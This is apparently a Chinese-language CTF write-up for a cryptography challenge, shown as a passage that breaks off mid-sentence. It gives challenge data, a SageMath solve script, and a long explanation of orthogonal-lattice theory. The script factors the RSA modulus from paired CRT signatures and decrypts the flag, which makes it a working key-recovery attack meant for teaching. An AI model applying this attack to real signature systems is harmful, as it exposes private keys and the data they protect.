[b&quot;\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&amp;H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-'\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&amp;w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&amp;'{\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+&quot;, b'\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe&quot;\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3}0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0', b'Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&amp;}a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb{\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d&lt;(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0', b&quot;0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed}\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN'\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&amp;&amp;`\\xfd*\\xe1\\xf2\\x9c&quot;, b':\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&amp;\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+', b'\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa&lt;\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&amp;\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8', ]sig = [b'\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&amp;\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9&quot;\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK', b'z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&amp;\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&amp;\\xdb8\\xa6\\xe0\\xa5a', b'U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc}\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m&quot;\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf&gt;6,&lt;\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|{6\\xeb\\xe8U\\x91\\xa4\\xeb}\\xf4s;E\\xe72$i\\xdft\\xff\\'', b'[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9&lt;H\\xa2a\\xdc\\xf4`\\xac&gt;\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f&gt;\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\'`K\\xa5\\xf1\\xbf&quot;\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\'1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[', b':\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&amp;\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2} \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19', b&quot;8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02&lt;\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05'o\\xf3!\\t\\x01\\x93'z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2}\\xe8\\x10&quot; ]n = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729N = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731e = 65537enc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396def orthogonal_lattice(B): _d, _n = B.nrows(), B.ncols() _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4), 20) for b in B: _c *= b.norm() B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n)) B_r = B_bot.transpose().LLL() LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d, _n+_d)) assert (B*LB.transpose()).is_zero() return LBv = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n]) for i in range(6)]Lv = orthogonal_lattice(matrix(ZZ, v))result = orthogonal_lattice(Lv.matrix_from_rows(range(0, 6-2)))for x, y in combinations(result, 2): for a in tqdm(range(-10, 10)): for b in range(-10, 10): z = a*x+b*y if z.norm() &gt; sqrt(6*n): continue else: vv = vector(v)-z for i in vv: if gcd(i, n) != 1: p = gcd(i, n) assert n % gcd(i, n) == 0 q = n//p phi = (p-1)*(q-1) d = inverse_mod(e, phi) m = long_to_bytes(int(pow(enc, d, n))) print(m) exit() 原理RSA-CRT 签名中计算了：$$\\sigma_p=\\mu(m)^d \\mod{p} \\\\\\sigma_q=\\mu(m)^d\\mod{q}$$然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。题目中给出 6 对签名，每对签名用 CRT 不难算出$$v=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod {N\\cdot N’}$$其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N’$ ，那么上式在整数域上是成立的。一对算不出，但是多对可以，组成向量，有：$$\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}$$其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 ${\\boldsymbol{b}_1,…,\\boldsymbol{b}_{\\ell-1}}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）特别地，我们有：$$\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1$$（也不是很特别的感觉）现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能： 情形1：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 情形2：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 因为格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积$$V=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)$$盲猜是一个随机的格。特别地，我们有：$$||\\boldsymbol{b}_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2$$ 一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,…,\\ell-2$ ， $\\boldsymbol{b}_j$ 应该是情形1中。这意味着这些向量生成 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 中一个满秩的子格 $L’=\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。取正交格，我们得到 $(L’)^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L’$ 的正交格 $(L’)^\\bot$ 。令 ${\\boldsymbol{x’},\\boldsymbol{y’}}$ 为一组该格的约化基，我们可以枚举 $(L’)^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x’}$ 和 $\\boldsymbol{y’}$ 线性组合的所有格向量。高斯启发式表明这大约为：$$\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L’)^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)$$这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 $\\boldsymbol{x}$ 是一个 $(L’)^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：$$\\boldsymbol{v}=\\boldsymbol{x}\\mod{p} \\\\\\boldsymbol{v}=\\boldsymbol{y}\\mod{q}$$故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。 拓展阅读-正交格令 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。 如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。 笔者注记：这里首先将 $\\mathit{\\Lambda}$ 张成一个有理数空间，不局限于整系数向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是欧几里得的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。PS:发现自己念了十年的欧几里得，难怪输入法打不出来（） 令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 （奇怪的表示方法）。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。 笔者注记：看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$ 。再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。至于其维度为何是 $n-d$ ，有个概念叫正交补，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 $E^\\bot$ 的写法较为广泛。 在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下： $$\\mathbf{b}_j =\\begin{pmatrix}b_{1,j} \\\\b_{2,j} \\\\\\vdots \\\\b_{n,j}\\end{pmatrix}$$（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题） 定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。 笔者注记：这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为$$\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) =\\begin{pmatrix}\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\\\vdots &amp; \\ddots &amp; \\vdots \\\\\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle\\end{pmatrix}$$不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。 定理1 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：$$\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}$$其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。 推论2 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。 定理3 令 $(\\mathbf{b}_1,…,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么： $\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$ 对任意线性无关的向量 $\\mathbf{x}_1,…,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有： $$||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,…,||\\mathbf{x}_t||)$$ 我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。 $$B^-=\\begin{pmatrix}c\\times b_{1,1} &amp; c\\times b_{2,1} &amp; \\cdots &amp; c\\times b_{n,1} \\\\c\\times b_{1,2} &amp; c\\times b_{2,2} &amp; \\cdots &amp; c\\times b_{n,2} \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\c\\times b_{1,d} &amp; c\\times b_{2,d} &amp; \\cdots &amp; c\\times b_{n,d} \\\\1 &amp; 0 &amp; \\cdots &amp; 0 \\\\0 &amp; 1 &amp; \\cdots &amp; 0 \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\0 &amp; 0 &amp; \\cdots &amp; 1\\end{pmatrix}$$矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。（这段翻译累死我了）令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么 $$p_{\\uparrow}(\\mathbf{y})=\\begin{pmatrix}\\mathbf{y}.\\mathbf{b}_1 \\\\\\vdots \\\\\\mathbf{y}.\\mathbf{b}_d\\end{pmatrix}$$因此，当且仅当 $p_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。 定理4 令 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若 $$c&gt;2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})$$则 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。 使用阿达马不等式，我们得到以下算法： 算法5 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,…,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。 选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$ 计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 对应的 $n\\times d$ 矩阵 $B=(b_{i,j})$ 计算由 $B^-$ 张成的格的一组 LLL 约化基 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$ 输出 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 